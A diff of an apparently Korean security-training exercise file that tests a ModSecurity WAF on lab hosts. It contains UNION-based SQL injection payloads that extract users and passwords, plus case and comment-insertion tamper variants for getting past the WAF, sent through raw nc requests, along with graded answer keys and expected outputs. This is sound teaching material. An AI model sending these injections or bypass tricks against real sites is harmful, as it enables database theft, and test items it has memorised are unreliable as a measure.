@@ -41,12 +41,12 @@ steps:
       # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
       command -v sqlmap
       # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
-      curl -s -o /dev/null -w '도달=%{http_code}\n' http://dvwa.el34.lab/
+      whatweb -a1 http://dvwa.el34.lab/
       ```
       > 💡 대상이 살아있는지는 **브라우저로 `http://dvwa.el34.lab/` 를 열어** DVWA 로그인 페이지가 뜨는지로도
-      > 확인한다(사람 방식). 위 curl 은 화면 없이 코드만 빠르게 보는 CLI 확인이다.
+      > 확인한다(사람 방식). 위 whatweb 은 서버·상태·타이틀을 한 줄로 지문하는 CLI 확인이다.
 
-      - `command -v sqlmap`(설치 경로), `curl ... http://dvwa.el34.lab/`(자연 URL — 호스트명이 dvwa vhost 지정), `-o /dev/null -w '%{http_code}'`(본문 버리고 코드만).
+      - `command -v sqlmap`(설치 경로), `whatweb -a1 http://dvwa.el34.lab/`(자연 URL — 호스트명이 dvwa vhost 지정, 서버·상태·타이틀 지문).
       ## ✅ 합격 기준
       `sqlmap` 출력 시 통과. **근거:** sqlmap 경로가 출력돼 사용 가능하고 dvwa 에 도달(HTTP 코드 응답)하면
       통과 — 공격 착수 전 도구·대상 준비 상태를 확인하는 기본 절차다.
@@ -57,11 +57,11 @@ steps:
       # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
       ssh att@192.168.0.202 'command -v sqlmap'
       # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w '도달=%{http_code}\n' http://dvwa.el34.lab/"
+      ssh att@192.168.0.202 "whatweb -a1 http://dvwa.el34.lab/"
     answer_detail: "SQLi 자동화 도구 sqlmap 이 attacker 에 설치됐는지(command -v 로 경로 확인)와 대상 vhost(dvwa=차단 모드, juice=탐지만)에 도달하는지를 점검한다. 공격 착수 전 도구·대상 준비 상태를 1분 내 확인하는 기본 절차다."
     expected_output: |
       /usr/bin/sqlmap
-      도달=302
+      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], IP[192.168.0.161], Title[403 Forbidden]
     verify:
       type: output_contains
       expect: 'sqlmap'
@@ -69,7 +69,7 @@ steps:
       semantic:
         intent: "sqlmap + 대상 점검"
         success_criteria: ["sqlmap 가용", "대상 도달"]
-        acceptable_methods: ["**[OSS] command -v + curl (권장)**"]
+        acceptable_methods: ["**[OSS] command -v + whatweb (권장)**"]
     target_vm: web
 
   - order: 2
@@ -89,7 +89,7 @@ steps:
       - **CLI(채점용, 내 공격 VM 에서):**
         ```bash
         ssh att@192.168.0.202
-        curl -s -o /dev/null -w 'dvwa=%{http_code}\n' "http://dvwa.el34.lab/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-"
+        echo "dvwa=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
         ```
       해석: UNION SELECT 가 CRS 942(SQLi)에 매치돼 anomaly 누적 → 949110 차단(403). 고전 평문 SQLi 는 CRS 가 가장 쉽게 잡는다.
       - payload `1' UNION SELECT user,password FROM users-- -`(URL 인코딩: `%27`=`'`, `%20`=공백, 끝 `-- -`=SQL 주석). dvwa vhost=`SecRuleEngine On`(차단 모드).
@@ -102,7 +102,7 @@ steps:
     points: 12
     answer: |
       # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' \"http://dvwa.el34.lab/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
+      echo "dvwa=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
     answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. dvwa(SecRuleEngine On)에서는 payload 가 942 룰군(SQLi 변형)에 매치되고 anomaly score 가 누적돼 949110(임계치 도달)이 발동, 403 으로 차단된다. 브라우저/Burp로 열면 403 Forbidden 페이지를 직접 본다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 403 응답으로 판정한다."
     expected_output: |
       dvwa=403
@@ -134,10 +134,10 @@ steps:
 
       ```bash
       # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
-      K=$(curl -s -o /dev/null -w '%{http_code}' "http://dvwa.el34.lab/?id=1%27%20UnIoN%20sElEcT%201--")
+      K=$(echo -en 'GET /?id=1%27%20UnIoN%20sElEcT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
       echo "case=$K"
       # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
-      C=$(curl -s -o /dev/null -w '%{http_code}' "http://dvwa.el34.lab/?id=1%27%20UN/**/ION%20SE/**/LECT%201--")
+      C=$(echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
       echo "comment=$C"
       # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
@@ -159,10 +159,10 @@ steps:
     points: 14
     answer: |
       # 1) 대소문자 tamper — UnIoN sElEcT (정규화로 복원되어 차단되는지)
-      K=$(ssh att@192.168.0.202 "curl -s -o /dev/null -w '%{http_code}' \"http://dvwa.el34.lab/?id=1%27%20UnIoN%20sElEcT%201--\"")
+      K=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UnIoN%20sElEcT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
       echo "case=$K"
       # 2) 주석삽입 tamper — UN/**/ION SE/**/LECT (키워드 사이 주석으로 토큰을 깨뜨림)
-      C=$(ssh att@192.168.0.202 "curl -s -o /dev/null -w '%{http_code}' \"http://dvwa.el34.lab/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\"")
+      C=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
       echo "comment=$C"
       # 3) 판정 — 주석삽입이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석삽입 우회 성공(comment=$C): 정규화가 주석분할은 못 잡음"; else echo "→ 주석삽입 차단/무응답(comment=$C)"; fi
@@ -294,9 +294,9 @@ steps:
 
       ```bash
       # 1) 같은 SQLi payload를 dvwa(차단 모드)로 — 응답코드
-      curl -s -o /dev/null -w 'dvwa=%{http_code} ' "http://dvwa.el34.lab/?id=1%27%20UNION%20SELECT%201--"
+      echo -n "dvwa=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}') "
       # 2) 같은 payload를 juice(DetectionOnly)로 — 응답코드
-      curl -s -o /dev/null -w 'juice=%{http_code}\n' "http://juice.el34.lab/?id=1%27%20UNION%20SELECT%201--"
+      echo "juice=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
       # 3) 해석 — dvwa=403(차단)/juice=200(탐지만), 같은 공격 다른 결과 = WAF 정책 차이
       ```
       > 💡 **브라우저로 같은 공격 URL 두 개를 각각 열어 화면으로 대조한다** —
@@ -314,9 +314,9 @@ steps:
     points: 12
     answer: |
       # 1) 같은 SQLi payload를 dvwa(차단 모드)로 — 응답코드
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code} ' \"http://dvwa.el34.lab/?id=1%27%20UNION%20SELECT%201--\""
+      echo -n "dvwa=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}') "
       # 2) 같은 payload를 juice(DetectionOnly)로 — 응답코드
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'juice=%{http_code}\n' \"http://juice.el34.lab/?id=1%27%20UNION%20SELECT%201--\""
+      echo "juice=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
       # 3) 해석 — dvwa=403(차단)/juice=200(탐지만), 같은 공격 다른 결과 = WAF 정책 차이
     answer_detail: "완전히 같은 payload 인데 WAF 운영 모드가 결과를 가른다 — dvwa(SecRuleEngine On)는 룰 매치 시 실제로 끊어 403, juice(DetectionOnly)는 탐지·기록만 하고 막지 않아 200. juice 의 200 은 우회 성공이 아니라 audit log 에 흔적이 남는 모니터링 모드일 뿐이다. 차단 vs 모니터링은 운영 정책의 선택이며, juice=200 확인으로 모드 차이를 판정한다."
     expected_output: |
